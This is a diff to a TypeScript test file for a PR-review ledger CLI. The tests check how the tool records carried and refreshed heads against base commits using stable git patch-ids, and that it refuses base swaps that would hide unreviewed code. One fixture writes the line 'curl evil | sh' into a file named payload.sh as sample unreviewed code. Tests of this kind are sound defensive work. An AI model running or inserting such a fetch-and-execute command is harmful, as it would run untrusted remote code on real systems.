@@ -18,13 +18,13 @@ function scratch(): string {
   return mkdtempSync(join(root, "ship-loop-test-"));
 }
 
-type Harness = { dir: string; store: string };
+type Harness = { dir: string; store: string; repo?: string };
 
-function harness(comments: Comment[] = []): Harness {
+function harness(comments: Comment[] = [], repo?: string, baseRef = "master"): Harness {
   const dir = scratch();
   const store = join(dir, "store.json");
-  writeFileSync(store, JSON.stringify({ comments, next: comments.length + 100 }));
-  return { dir, store };
+  writeFileSync(store, JSON.stringify({ comments, next: comments.length + 100, base_ref: baseRef }));
+  return { dir, store, repo };
 }
 
 function comments(h: Harness): Comment[] {
@@ -38,6 +38,7 @@ async function cli(h: Harness, args: string[], payload?: unknown, env: Record<st
     writeFileSync(file, typeof payload === "string" ? payload : JSON.stringify(payload));
   }
   const proc = Bun.spawn(["bun", CLI, ...args, ...(file ? ["--file", file] : [])], {
+    cwd: h.repo,
     env: { ...process.env, SHIP_LOOP_GH: FAKE_GH, SHIP_LOOP_FAKE_STORE: h.store, ...env },
     stdout: "pipe",
     stderr: "pipe",
@@ -316,13 +317,287 @@ test("a carry needs an unchanged patch-id, and only moves head before the ruling
     ticket: TICKET, pr_url: PR, rigor: "light", rigor_reason: "docs", base: BASE, head: H1, carried: [], phase: "judge",
     builder_threads: ["b"], judge_threads: [], reports: {}, recheck: null, fix_round: 0, fix: null, verdict: null,
   };
-  const carry = (patchFrom: string, patchTo: string): Event => ({ v: 1, kind: "head", seq: 3, key: "", reason: "carry", from: H1, sha: H2, patch_id_from: patchFrom, patch_id_to: patchTo });
+  const carry = (patchFrom: string, patchTo: string, bases: Record<string, string> = {}): Event => ({ v: 1, kind: "head", seq: 3, key: "", reason: "carry", from: H1, sha: H2, patch_id_from: patchFrom, patch_id_to: patchTo, ...bases });
   expect(() => apply(judged, carry("p1", "p2"))).toThrow(/unchanged patch-id/);
   const moved = apply(judged, carry("p1", "p1"));
   expect(moved.head).toBe(H2);
   expect(moved.carried).toEqual([H1]);
   expect(moved.phase).toBe("judge");
+  expect(moved.base).toBe(BASE);
   expect(() => apply({ ...judged, phase: "verify" }, carry("p1", "p1"))).toThrow(/before a ruling/);
+
+  const [oldBase, newBase] = ["a".repeat(40), "b".repeat(40)];
+  expect(apply(judged, carry("p1", "p1", { from_base: oldBase, to_base: newBase })).base).toBe(newBase);
+  expect(() => apply(judged, carry("p1", "p1", { from_base: oldBase }))).toThrow(/bases must both be full commit SHAs/);
+  expect(() => apply(judged, carry("p1", "p1", { from_base: oldBase, to_base: "origin/master" }))).toThrow(/full commit SHAs/);
+  expect(() => apply(judged, carry("p1", "p1", { base: newBase }))).toThrow(/unknown field "base"/);
+});
+
+test("v1 carry events without bases replay with their original meaning", () => {
+  const events = [
+    { v: 1, kind: "init", seq: 1, ticket: TICKET, pr_url: PR, rigor: "light", rigor_reason: "docs", base: BASE, sha: H1, builder_thread_id: "b" },
+    { v: 1, kind: "report", seq: 2, role: "qa-review", sha: H1, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] },
+    { v: 1, kind: "verdict", seq: 3, thread_id: "judge-1", sha: H1, verdict: "SHIP", blockers: [], tickets: [], report_url: "v" },
+    { v: 1, kind: "head", seq: 4, reason: "carry", from: H1, sha: H2, patch_id_from: "p1", patch_id_to: "p1" },
+  ];
+  const ledger = replay(events.map((e, i) => ({ id: i + 1, author: "conductor", body: renderWithKey(e) })), "conductor");
+  expect(ledger.last_seq).toBe(4);
+  expect(ledger.state).toMatchObject({ phase: "shipped", head: H2, carried: [H1], base: BASE, fix_round: 0 });
+});
+
+test("a pre-review refresh moves head and base, and cannot reset a reported, ruled or fixed PR", () => {
+  const fresh: State = {
+    ticket: TICKET, pr_url: PR, rigor: "standard", rigor_reason: "runtime", base: BASE, head: H1, carried: [], phase: "verify",
+    builder_threads: ["b"], judge_threads: [], reports: {}, recheck: null, fix_round: 0, fix: null, verdict: null,
+  };
+  const newBase = "3".repeat(40);
+  const refresh: Event = { v: 1, kind: "head", seq: 2, key: "", reason: "refresh", from: H1, sha: H2, base: newBase };
+  expect(apply(fresh, refresh)).toEqual({ ...fresh, head: H2, base: newBase });
+  expect(() => apply(fresh, { ...refresh, from: H2, sha: "4".repeat(40) })).toThrow(/refresh is from/);
+  expect(() => apply(fresh, { ...refresh, base: "origin/master" })).toThrow(/full commit SHA/);
+  expect(() => apply(fresh, { ...refresh, patch_id_to: "p", from_base: newBase })).toThrow(/unknown field "from_base"/);
+
+  const report = { role: "qa", sha: H1, thread_id: "qa-1", report_url: "u", outcome: "ISSUES", findings: [finding("F1")] };
+  const reported: State = { ...fresh, reports: { qa: report } };
+  expect(() => apply(reported, refresh)).toThrow(/only before any report; this PR is in verify with 1 report/);
+  const fixed: State = { ...reported, phase: "fix", fix_round: 1, fix: { blockers: ["qa:F1"], reporter_thread: "qa-1", judge_thread: "judge-1", sha: H1 }, verdict: { verdict: "FIX", sha: H1, thread_id: "judge-1" } };
+  for (const phase of ["judge", "fix", "recheck", "final-judge", "shipped", "revert-split"] as const) {
+    expect(() => apply({ ...fixed, phase }, refresh)).toThrow(/only before any report/);
+  }
+});
+
+// ---- real Git fixtures: the CLI computes actual stable patch-ids ----
+
+function git(repo: string, ...args: string[]): string {
+  const r = Bun.spawnSync(["git", "-c", "user.name=t", "-c", "user.email=t@example.test", "-c", "commit.gpgsign=false", ...args], { cwd: repo, stdout: "pipe", stderr: "pipe" });
+  if (r.exitCode !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr.toString()}`);
+  return r.stdout.toString().trim();
+}
+
+function commitFile(repo: string, file: string, content: string): string {
+  writeFileSync(join(repo, file), content);
+  git(repo, "add", file);
+  git(repo, "commit", "-qm", `edit ${file}`);
+  return git(repo, "rev-parse", "HEAD");
+}
+
+function gitRepo(): string {
+  const repo = join(scratch(), "repo");
+  mkdirSync(repo);
+  git(repo, "init", "-q", "-b", "master");
+  commitFile(repo, "main.txt", "main\n");
+  git(repo, "update-ref", "refs/remotes/origin/master", "HEAD");
+  return repo;
+}
+
+function stablePatchId(repo: string, base: string, sha: string): string {
+  const diff = Bun.spawnSync(["git", "diff", `${base}...${sha}`], { cwd: repo }).stdout;
+  return Bun.spawnSync(["git", "patch-id", "--stable"], { cwd: repo, stdin: diff }).stdout.toString().split(" ")[0];
+}
+
+function lastEvent(h: Harness): Record<string, unknown> {
+  const body = comments(h).at(-1)!.body;
+  return JSON.parse(/```json\n([\s\S]*)\n```/.exec(body)![1]);
+}
+
+test("a carry compares each revision with its own base across a squash-merged stack parent and new main", async () => {
+  // Harness PR496 shape: a child reviewed and fixed on its stack parent; the parent squash-merges, main moves on, the child rebases onto main.
+  const repo = gitRepo();
+  git(repo, "switch", "-qc", "parent");
+  commitFile(repo, "parent.txt", "one\n");
+  const parent = commitFile(repo, "parent.txt", "one\ntwo\n");
+  git(repo, "switch", "-qc", "child");
+  const reviewed = commitFile(repo, "child.txt", "child\n");
+  const fixed = commitFile(repo, "child.txt", "child\nfixed\n");
+  git(repo, "switch", "-q", "master");
+  git(repo, "merge", "-q", "--squash", "parent");
+  git(repo, "commit", "-qm", "parent (squash)");
+  const main = commitFile(repo, "unrelated.txt", "main moved on\n");
+  git(repo, "update-ref", "refs/remotes/origin/master", main);
+  git(repo, "update-ref", "refs/remotes/origin/parent", parent);
+  git(repo, "switch", "-q", "--detach", fixed);
+  git(repo, "rebase", "-q", "--onto", "master", "parent");
+  const rebased = git(repo, "rev-parse", "HEAD");
+  git(repo, "switch", "-q", "--detach", rebased);
+  const drifted = commitFile(repo, "child.txt", "child\nfixed\nunreviewed\n");
+  // The ledger's single base cannot carry this: the new diff includes the squashed parent and the unrelated main change.
+  expect(stablePatchId(repo, "parent", fixed)).not.toBe(stablePatchId(repo, "parent", rebased));
+
+  const h = harness([], repo, "parent");
+  const url = (n: number) => `https://example.test/${n}`;
+  expect((await cli(h, ["init", "--pr", PR, "--ticket", TICKET, "--rigor", "standard", "--rigor-reason", "runtime", "--base", parent, "--sha", reviewed, "--builder-thread", "builder-1"])).code).toBe(0);
+  for (const [role, findings] of [["qa", [finding("F1")]], ["review", []]] as const) {
+    expect((await cli(h, ["record", "--pr", PR, "--kind", "report"], { role, sha: reviewed, thread_id: `${role}-1`, report_url: url(1), outcome: "ISSUES", findings })).code).toBe(0);
+  }
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "verdict"], { thread_id: "judge-1", sha: reviewed, verdict: "FIX", blockers: ["qa:F1"], report_url: url(2) })).code).toBe(0);
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "fix", sha: fixed, thread_id: "builder-2" })).code).toBe(0);
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "recheck"], { thread_id: "qa-recheck-1", reporter_thread_id: "qa-1", sha: fixed, report_url: url(3), regressions: [], results: [{ blocker: "qa:F1", status: "fixed", evidence: url(4) }] })).code).toBe(0);
+  const before = await status(h);
+  const posted = comments(h).length;
+  const notRetargeted = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: fixed, from_base: parent, sha: rebased, to_base: main });
+  expect(notRetargeted.code).toBe(1);
+  expect(comments(h).length).toBe(posted);
+  const store = JSON.parse(readFileSync(h.store, "utf8"));
+  store.base_ref = "master";
+  writeFileSync(h.store, JSON.stringify(store));
+
+  const unequal = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: fixed, from_base: "parent", sha: drifted, to_base: "master" });
+  expect(unequal.code).toBe(1);
+  expect(unequal.err).toContain("unchanged patch-id");
+  const unknownBase = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: fixed, from_base: "no-such-branch", sha: rebased, to_base: "master" });
+  expect(unknownBase.code).toBe(1);
+  expect(unknownBase.err).toContain("no-such-branch is not a commit in this checkout");
+  const noBase = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: fixed, sha: rebased, to_base: "master" });
+  expect(noBase.code).toBe(1);
+  expect(noBase.err).toContain("from_base is required");
+  expect(comments(h).length).toBe(posted);
+
+  const carried = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: fixed, from_base: "parent", sha: rebased, to_base: "master" });
+  expect(carried.code).toBe(0);
+  const event = lastEvent(h);
+  expect(event).toMatchObject({ reason: "carry", from: fixed, sha: rebased, from_base: parent, to_base: main });
+  expect(event.patch_id_from).toBe(stablePatchId(repo, parent, fixed));
+  expect(event.patch_id_to).toBe(event.patch_id_from);
+
+  const after = await status(h);
+  expect(after.doc).toMatchObject({ phase: "final-judge", source_head: rebased, carried_shas: [fixed], base: main, fix_round: 1, fix_blockers: ["qa:F1"] });
+  expect(after.doc.recheck).toEqual(before.doc.recheck);
+  expect(after.doc.review_thread_ids).toEqual(before.doc.review_thread_ids);
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "verdict"], { thread_id: "judge-2", sha: rebased, verdict: "SHIP", blockers: [], tickets: [], report_url: url(5) })).code).toBe(0);
+  expect((await status(h)).doc.phase).toBe("shipped");
+  const recorded = readFileSync(h.store, "utf8");
+  const retry = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: fixed, from_base: "parent", sha: rebased, to_base: "master" });
+  expect(retry.code).toBe(0);
+  expect(readFileSync(h.store, "utf8")).toBe(recorded);
+});
+
+test("a pinned-base PR carries its SHIP across a merge of newer main, and refresh moves an unreviewed head", async () => {
+  // Harness PR461 shape: the PR was judged against a pinned base, then newer main was merged into it.
+  const repo = gitRepo();
+  const pinned = git(repo, "rev-parse", "HEAD");
+  git(repo, "switch", "-qc", "pr");
+  const judged = commitFile(repo, "feature.txt", "feature\n");
+  git(repo, "switch", "-q", "master");
+  const main = commitFile(repo, "unrelated.txt", "main moved on\n");
+  git(repo, "update-ref", "refs/remotes/origin/master", main);
+  git(repo, "switch", "-q", "pr");
+  git(repo, "merge", "-q", "--no-edit", "master");
+  const merged = git(repo, "rev-parse", "HEAD");
+  expect(stablePatchId(repo, pinned, judged)).not.toBe(stablePatchId(repo, pinned, merged));
+
+  const shipped = harness([], repo);
+  expect((await cli(shipped, ["init", "--pr", PR, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "docs", "--base", pinned, "--sha", judged, "--builder-thread", "builder-1"])).code).toBe(0);
+  expect((await cli(shipped, ["record", "--pr", PR, "--kind", "report"], { role: "qa-review", sha: judged, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] })).code).toBe(0);
+  expect((await cli(shipped, ["record", "--pr", PR, "--kind", "verdict"], { thread_id: "judge-1", sha: judged, verdict: "SHIP", blockers: [], tickets: [], report_url: "v" })).code).toBe(0);
+  expect((await cli(shipped, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: judged, from_base: pinned, sha: merged, to_base: "master" })).code).toBe(0);
+  expect((await status(shipped)).doc).toMatchObject({ phase: "shipped", source_head: merged, base: main, carried_shas: [judged] });
+
+  // Before any report, the same new head is a refresh: init and the fix budget stay, head and base move.
+  const h = harness([], repo);
+  expect((await cli(h, ["init", "--pr", PR, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "docs", "--base", pinned, "--sha", judged, "--builder-thread", "builder-1"])).code).toBe(0);
+  const missing = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "refresh", from: judged, sha: "f".repeat(40), base: "master" });
+  expect(missing.code).toBe(1);
+  expect(missing.err).toContain(`${"f".repeat(40)} is not a commit in this checkout`);
+  const refreshed = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "refresh", from: judged, sha: merged, base: "master" });
+  expect(refreshed.code).toBe(0);
+  expect(lastEvent(h)).toMatchObject({ reason: "refresh", from: judged, sha: merged, base: main });
+  expect((await status(h)).doc).toMatchObject({ phase: "verify", source_head: merged, base: main, fix_round: 0, carried_shas: [], builder_thread_ids: ["builder-1"], last_seq: 2 });
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "report"], { role: "qa-review", sha: judged, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] })).code).toBe(1);
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "report"], { role: "qa-review", sha: merged, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] })).code).toBe(0);
+
+  git(repo, "switch", "-q", "--detach", merged);
+  const later = commitFile(repo, "feature.txt", "feature\nlater\n");
+  const afterReport = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "refresh", from: merged, sha: later, base: "master" });
+  expect(afterReport.code).toBe(1);
+  expect(afterReport.err).toContain("a refresh applies only before any report");
+});
+
+async function shipFixture(h: Harness, base: string, judged: string, fixed?: string) {
+  expect((await cli(h, ["init", "--pr", PR, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "carry regression", "--base", base, "--sha", judged, "--builder-thread", "builder-1"])).code).toBe(0);
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "report"], {
+    role: "qa-review", sha: judged, thread_id: "qa-1", report_url: "u", outcome: fixed ? "ISSUES" : "PASS", findings: fixed ? [finding("F1")] : [],
+  })).code).toBe(0);
+  if (fixed) {
+    expect((await cli(h, ["record", "--pr", PR, "--kind", "verdict"], { thread_id: "judge-1", sha: judged, verdict: "FIX", blockers: ["qa-review:F1"], report_url: "v" })).code).toBe(0);
+    expect((await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "fix", sha: fixed, thread_id: "builder-2" })).code).toBe(0);
+    expect((await cli(h, ["record", "--pr", PR, "--kind", "recheck"], {
+      thread_id: "recheck-1", reporter_thread_id: "qa-1", sha: fixed, report_url: "r", regressions: [], results: [{ blocker: "qa-review:F1", status: "fixed", evidence: "owner check added" }],
+    })).code).toBe(0);
+  }
+  expect((await cli(h, ["record", "--pr", PR, "--kind", "verdict"], { thread_id: fixed ? "judge-2" : "judge-1", sha: fixed ?? judged, verdict: "SHIP", blockers: [], tickets: [], report_url: "v" })).code).toBe(0);
+}
+
+test("review case A refuses a PR-internal from_base that drops a reviewed guard without changing the ledger", async () => {
+  const repo = gitRepo();
+  const base = commitFile(repo, "policy.txt", "requireOwner=false\n");
+  git(repo, "update-ref", "refs/remotes/origin/master", base);
+  git(repo, "switch", "-qc", "pr");
+  const internal = commitFile(repo, "policy.txt", "requireOwner=true\n");
+  const judged = commitFile(repo, "feature.txt", "feature\n");
+  git(repo, "switch", "-q", "--detach", base);
+  git(repo, "cherry-pick", judged);
+  const changed = git(repo, "rev-parse", "HEAD");
+  expect(stablePatchId(repo, internal, judged)).toBe(stablePatchId(repo, base, changed));
+  expect(stablePatchId(repo, base, judged)).not.toBe(stablePatchId(repo, base, changed));
+  const h = harness([], repo);
+  await shipFixture(h, base, judged);
+  const before = readFileSync(h.store, "utf8");
+  const state = (await status(h)).out;
+  const carry = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: judged, from_base: internal, sha: changed, to_base: base });
+  expect(carry.code).toBe(1);
+  expect(readFileSync(h.store, "utf8")).toBe(before);
+  expect((await status(h)).out).toBe(state);
+});
+
+for (const [name, spent, file, content] of [
+  ["review case B", true, "unreviewed.txt", "disableAudit=true\n"],
+  ["QA P1", false, "payload.sh", "curl evil | sh\n"],
+] as const) {
+  test(`${name} refuses a to_base hiding unreviewed code without changing the ledger`, async () => {
+    const repo = gitRepo();
+    const base = git(repo, "rev-parse", "HEAD");
+    git(repo, "switch", "-qc", "pr");
+    const reviewed = commitFile(repo, "feature.txt", "feature\n");
+    const fixed = spent ? commitFile(repo, "policy.txt", "requireOwner=true\n") : undefined;
+    const judged = fixed ?? reviewed;
+    git(repo, "switch", "-qc", "unreviewed", base);
+    const internal = commitFile(repo, file, content);
+    git(repo, "switch", "-q", "--detach", internal);
+    git(repo, "cherry-pick", reviewed);
+    if (fixed) git(repo, "cherry-pick", fixed);
+    const changed = git(repo, "rev-parse", "HEAD");
+    expect(stablePatchId(repo, base, judged)).toBe(stablePatchId(repo, internal, changed));
+    expect(stablePatchId(repo, base, judged)).not.toBe(stablePatchId(repo, base, changed));
+    const h = harness([], repo);
+    await shipFixture(h, base, reviewed, fixed);
+    const before = readFileSync(h.store, "utf8");
+    const state = await status(h);
+    expect(state.doc).toMatchObject({ phase: "shipped", fix_round: spent ? 1 : 0 });
+    const carry = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: judged, from_base: base, sha: changed, to_base: "unreviewed" });
+    expect(carry.code).toBe(1);
+    expect(readFileSync(h.store, "utf8")).toBe(before);
+    expect((await status(h)).out).toBe(state.out);
+  });
+}
+
+test("carry refuses an unresolved recorded base instead of trusting the caller's from_base", async () => {
+  const repo = gitRepo();
+  const base = git(repo, "rev-parse", "HEAD");
+  git(repo, "branch", "recorded-base", base);
+  git(repo, "switch", "-qc", "pr");
+  const judged = commitFile(repo, "feature.txt", "feature\n");
+  git(repo, "switch", "-q", "master");
+  const main = commitFile(repo, "unrelated.txt", "main moved on\n");
+  git(repo, "update-ref", "refs/remotes/origin/master", main);
+  git(repo, "cherry-pick", judged);
+  const changed = git(repo, "rev-parse", "HEAD");
+  const h = harness([], repo);
+  await shipFixture(h, "recorded-base", judged);
+  git(repo, "branch", "-D", "recorded-base");
+  const before = readFileSync(h.store, "utf8");
+  const carry = await cli(h, ["record", "--pr", PR, "--kind", "head"], { reason: "carry", from: judged, from_base: base, sha: changed, to_base: main });
+  expect(carry.code).toBe(1);
+  expect(readFileSync(h.store, "utf8")).toBe(before);
 });
 
 test("statusOf reports a missing ledger as absent, not as a round", () => {
